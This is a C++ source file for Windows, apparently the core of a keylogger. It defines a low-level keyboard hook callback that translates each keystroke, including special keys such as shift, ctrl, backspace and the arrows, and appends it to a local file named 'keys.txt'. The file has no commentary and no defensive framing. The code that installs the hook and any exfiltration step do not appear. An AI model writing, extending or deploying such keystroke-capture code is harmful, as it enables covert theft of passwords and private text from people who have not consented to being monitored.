#include <windows.h>
#include <string>

HHOOK hKeyHook;
BYTE keyState[256];
WCHAR buffer[16];
KBDLLHOOKSTRUCT kbdllStruct;

LRESULT WINAPI GetKey(int nCode, WPARAM wParam, LPARAM lParam){
	if((nCode == HC_ACTION) && ((wParam == WM_SYSKEYDOWN) || (wParam == WM_KEYDOWN))){
		
		FILE *LOG;
	    kbdllStruct = *((KBDLLHOOKSTRUCT*)lParam);
	    LOG = fopen("keys.txt", "a");
	    
	    switch((unsigned int)kbdllStruct.vkCode){
	        case 0x08:
				fprintf(LOG, "[backspace]");
				break;
	        
	        case 0x09:
	            fprintf(LOG,"[tab]");
	        	break;
	        
	        case 0x0D:
	            fprintf(LOG, "[enter]");
	        	break;
	        
	        case 0x1B:
	            fprintf(LOG,"[esc]");
	        	break;            
	        
	        case 0xA4:
	            fprintf(LOG,"[alt]");
	        	break;
	        
	        case 0x25:
	        	fprintf(LOG,"[left]");
	        	break;
	        
	        case 0x26:
	            fprintf(LOG,"[up]");
	        	break;
	          
	        case 0x27:
	        	fprintf(LOG,"[right]");
	        	break;
	        
	        case 0x28:
	            fprintf(LOG,"[down]");
	        	break;
	        
	        case 0x2E:
	            fprintf(LOG,"[delete]");
	        	break;
	        
	        case 0xA0:
	        case 0xA1:
	            fprintf(LOG,"[shift]");
	        	break;
	        
	        case 0xA2:
	        case 0xA3:
	            fprintf(LOG,"[ctrl]");
	        	break;
	        
	        default:
	            GetKeyboardState((PBYTE)&keyState);
	            ToUnicode(kbdllStruct.vkCode, kbdllStruct.scanCode, (PBYTE)&keyState, (LPWSTR)&buffer, sizeof(buffer)/2, 0);
	            fprintf(LOG, "%c",buffer[0]);
	        	break;
	    }
	    fclose(LOG);
	}
	if((nCode == HC_ACTION) && ((wParam == WM_SYSKEYUP) || (wParam == WM_KEYUP))){
        kbdllStruct = *((KBDLLHOOKSTRUCT*)lParam); 
         
        FILE *LOG;
        LOG = fopen("keys.txt", "a");
        
        switch((unsigned int)kbdllStruct.vkCode){
            case 0xA1:
            	fprintf(LOG,"[right shift up]");
        		break;
        	case 0xA0:
                fprintf(LOG,"[left shift up]");
        		break;
        }
        fclose(LOG);  
    }    
	return CallNextHookEx(hKeyHook, nCode, wParam, lParam);
}
